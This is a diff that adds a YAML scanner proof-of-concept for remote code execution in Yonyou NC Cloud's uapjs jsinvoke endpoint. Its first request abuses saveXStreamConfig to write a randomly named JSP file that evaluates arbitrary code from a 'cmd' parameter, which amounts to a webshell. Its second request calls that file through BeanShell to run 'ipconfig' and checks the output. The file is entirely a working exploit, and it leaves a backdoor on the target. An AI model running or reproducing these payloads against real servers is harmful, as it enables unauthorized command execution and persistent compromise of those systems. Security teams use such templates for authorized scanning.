@@ -1,0 +1,16 @@
+name: yongyou-nccloud-uapjs-upload-rce
+rules:
+  - method: POST
+    path: "/uapjs/jsinvoke/?action=invoke"
+    body: |
+      {"serviceName":"nc.itf.iufo.IBaseSPService","methodName":"saveXStreamConfig","parameterTypes":["java.lang.Object","java.lang.String"],"parameters":["${param.getClass().forName(param.error).newInstance().eval(param.cmd)}","webapps/nc_web/{{randstr}}.jsp"]}
+    expression: |
+      response.status == 200
+  - method: POST
+    path: "/{{randstr}}.jsp?error=bsh.Interpreter"
+    body: |
+      cmd=org.apache.commons.io.IOUtils.toString(Runtime.getRuntime().exec("ipconfig").getInputStream())
+    expression: |
+      response.status == 200 && response.body.bcontains(b'Windows IP')
+detail:
+  author: 666
